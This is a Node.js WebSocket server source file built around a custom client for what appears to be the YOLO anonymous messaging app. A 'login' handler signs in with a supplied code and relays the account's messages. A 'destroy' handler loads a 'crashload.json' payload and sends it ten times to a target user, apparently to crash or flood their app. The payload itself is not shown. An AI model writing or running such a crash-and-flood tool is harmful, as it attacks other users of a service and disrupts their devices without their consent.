const onYolo = require('./custom_modules/yolo');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 6262 });

wss.on('connection', ws => {
    console.log('connected');
    ws.on('message', message => {
        message = parse(message);
        if (!message) return;

        if (message.method == "login") {
            const client = new onYolo.Client();
            
            client.on('ready', () => {
                client.get.messages().then(messages => {
                    send(ws, 'success', client.user);
                    messages.forEach(message => {
                        send(ws, 'message', message);
                    });
                });
            });

            client.login(message.body.code).catch(err => {
                send(ws, 'failed', null);
                console.log(err);
            });
        };

        if (message.method == "destroy") {
            const crash = require('./crashload.json');

            for (i = 0; i < 10; i++) {
                console.log(`Sending Payload to ${message.body.code}`);
                onYolo.send(message.body.code, crash.payload);
                send(ws, 'failed', null);
            };
        };

        if (message.method == "delete") {

        };
    });

    ws.on('error', () => undefined);
});

wss.on('error', () => undefined);

function send(ws, method, body) {
    ws.send(JSON.stringify({
        method: method,
        body: body
    }));
};

function parse(message) {
    try {
        return JSON.parse(message);
    } catch (e) {
        return null;
    };
};